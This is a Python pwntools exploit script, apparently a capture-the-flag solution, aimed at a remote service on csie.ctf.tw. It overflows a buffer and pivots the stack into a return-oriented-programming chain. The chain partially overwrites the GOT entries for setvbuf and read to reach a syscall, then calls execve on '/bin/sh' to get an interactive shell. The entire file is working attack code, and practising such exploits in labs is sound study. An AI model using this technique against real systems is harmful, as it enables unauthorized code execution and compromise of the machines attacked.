import time

from pwn import *

context.arch = "amd64"

pop_rdi = 0x4006b3
pop_rsi_r15 = 0x4006b1
read_plt = 0x4004c0
read_got = 0x601020
setvbuf_plt = 0x4004e0
setvbuf_got = 0x601030
leave = 0x400646
ret = 0x400499
pop_r12___pop_r13___pop_r14___pop_r15 = 0x4006ac
mov_rdx_r13___mov_rsi_r14___mov_edi_r15___call_r12___add_rsp_0x8___pop_rbx___pop_rbp___pop_r_12_to_15 = 0x400690

buf_rop = 0x601100
buf_tmp = 0x601fe0
main_read = 0x40062b

def ceil(num, block):
    return num/block + (num % block > 0)

def write_4_qword(r, address, data):
    global buf_tmp
    global main_read
    payload = 'A' * 0x20
    payload += p64(address)
    payload += p64(main_read)
    time.sleep(0.5)
    r.send(payload)
    payload = data.ljust(0x20, '\x00')
    payload += p64(buf_tmp)
    payload += p64(main_read)
    time.sleep(0.5)
    r.send(payload)

def set_rsp(r, address):
    global leave
    payload = 'A' * 0x20
    payload += p64(address)
    payload += p64(leave)
    time.sleep(0.5)
    r.send(payload)

r = remote("csie.ctf.tw", 10135)

rop1 = 'A' * 32 + flat([buf_tmp, main_read])
r.sendafter(':', rop1)

rop = flat([
    # pop rbp ( leave second part )
    0x1,

    # set rdx = 2
    pop_r12___pop_r13___pop_r14___pop_r15,
    buf_rop - 0x20 + 69 * 0x8,
    0x2,
    0x0,
    0x0,
    mov_rdx_r13___mov_rsi_r14___mov_edi_r15___call_r12___add_rsp_0x8___pop_rbx___pop_rbp___pop_r_12_to_15,
    0x0,
    0x0,
    0x1,
    0x0,
    0x0,
    0x0,
    0x0,
    
    # set last two bytes of setvbuf_got
    pop_rsi_r15,
    setvbuf_got,
    0x0,
    read_plt,
    
    # set rdx = 1
    pop_r12___pop_r13___pop_r14___pop_r15,
    buf_rop - 0x20 + 69 * 0x8,
    0x1,
    0x0,
    0x0,
    mov_rdx_r13___mov_rsi_r14___mov_edi_r15___call_r12___add_rsp_0x8___pop_rbx___pop_rbp___pop_r_12_to_15,
    0x0,
    0x0,
    0x1,
    0x0,
    0x0,
    0x0,
    0x0,

    # set last one bytes of read_got 
    pop_rsi_r15,
    read_got,
    0x0,
    read_plt,
    
    # set rdx = 0x3b
    pop_r12___pop_r13___pop_r14___pop_r15,
    buf_rop - 0x20 + 69 * 0x8,
    0x3b,
    0x0,
    0x0,
    mov_rdx_r13___mov_rsi_r14___mov_edi_r15___call_r12___add_rsp_0x8___pop_rbx___pop_rbp___pop_r_12_to_15,
    0x0,
    0x0,
    0x1,
    0x0,
    0x0,
    0x0,
    0x0,

    # set rax = rdx ( mov rax, rdx ; pop rbx ; pop rbp ; ret )
    setvbuf_plt,
    0x0,
    0x1,

    # set rdx = 0
    pop_r12___pop_r13___pop_r14___pop_r15,
    buf_rop - 0x20 + 69 * 0x8,
    0x0,
    0x0,
    0x0,
    mov_rdx_r13___mov_rsi_r14___mov_edi_r15___call_r12___add_rsp_0x8___pop_rbx___pop_rbp___pop_r_12_to_15,
    0x0,
    0x0,
    0x1,
    0x0,
    0x0,
    0x0,
    0x0,

    # set rdi
    pop_rdi,
    buf_rop - 0x20 + 68 * 0x8,
    read_plt,

    # go
    read_plt,
    
    # data
    u64("/bin/sh\x00"), # 68
    ret                 # 69
])
rop = rop.ljust(ceil(len(rop), 32), '\x00')
for i in xrange(0, len(rop), 0x20):
    write_4_qword(r, buf_rop + i, rop[i:i+0x20])
set_rsp(r, buf_rop - 0x20)
time.sleep(0.5)
r.send('\x5f\xcf')
time.sleep(0.5)
r.send('\x2e')

r.interactive()
